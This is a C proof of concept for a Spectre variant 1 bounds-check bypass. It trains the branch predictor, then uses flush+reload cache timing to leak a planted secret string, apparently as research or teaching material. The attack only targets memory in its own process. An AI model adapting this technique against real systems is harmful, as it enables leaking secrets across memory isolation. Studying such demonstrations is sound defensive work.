//! modified from https://gist.github.com/ErikAugust/724d4a969fb2c6ae1bbd7b2a9e3d4bb6

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <x86intrin.h> /* for rdtscp and clflush */
#include <string.h>
#include "../sidechannel/flush_reload.h"


#define CACHE_MISS 80
#define PAGESIZE 4096
#define SECRET "foobar"
#define TRIES 10

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
char* victim_block;
char* oracle_block;

char* secret= SECRET;



void victim_function(size_t x) {
  // precompute address
  char* addr = oracle_block + victim_block[x] *PAGESIZE;
  _mm_mfence();
  // a bounds check bypass: should not be able to access at 16 or above
  if ((float)x / (float)array1_size < 1.0) {
    maccess(addr);
  }
}

/********************************************************************
Analysis code
********************************************************************/

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
  static int results[256];
  static int tries, i, j, k, mix_i;
  size_t training_x, x;

  for (i = 0; i < 256; i++){
    results[i] = 0;
  }
  for (tries = TRIES; tries > 0; tries--) {

    flush(oracle_block, PAGESIZE);


    _mm_mfence();
    training_x = tries % array1_size;
    for (j = 30; j >= 0; j--) {
      _mm_clflush( & array1_size);
      for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */

      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
      /* Avoid jumps in case those tip off the branch predictor */
      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
      x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
      x = training_x ^ (x & (malicious_x ^ training_x));

      /* Call the victim! */
      victim_function(x);
      _mm_mfence();
    }
    _mm_mfence();
    probe(oracle_block,CACHE_MISS, PAGESIZE, results);

    
    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    /* Locate highest & second-highest results results tallies in j/k */
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }
    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
      break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */

  }
  value[0] = (uint8_t) j;
  score[0] = results[j];
  value[1] = (uint8_t) k;
  score[1] = results[k];
}

int main(int argc,
  const char * * argv) {
  size_t malicious_x = 16;
  int i, score[2], len = sizeof(SECRET) - 1;
  uint8_t value[2];
  

  // initialise victim block: first, allocate memory
  victim_block = malloc(array1_size + len);


  // then, fill with 16 "visible" elements, then with secret
  for (i = 0; i < 16 + len; i++){
    if (i < 16){
      victim_block[i] = i;
      continue;
    }
    victim_block[i] = secret[i - 16];
  }

  // allocate oracle memory block for flush-reload, set to 1 to prevent aliasing
  oracle_block = malloc(256 * PAGESIZE);
  memset(oracle_block, 1, 256*PAGESIZE);


  printf("Reading %d bytes:\n", len);
  while (--len >= 0) {
    printf("Reading at malicious_x = %p... ", (void * ) malicious_x);
    readMemoryByte(malicious_x++, value, score);
    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X=’%c’ score=%d ", value[0],
      (value[0] > 31 && value[0] < 127 ? value[0] : "?"), score[0]);
    if (score[1] > 0)
      printf("(second best: 0x%02X score=%d)", value[1], score[1]);
    printf("\n");
  }
  return (0);
}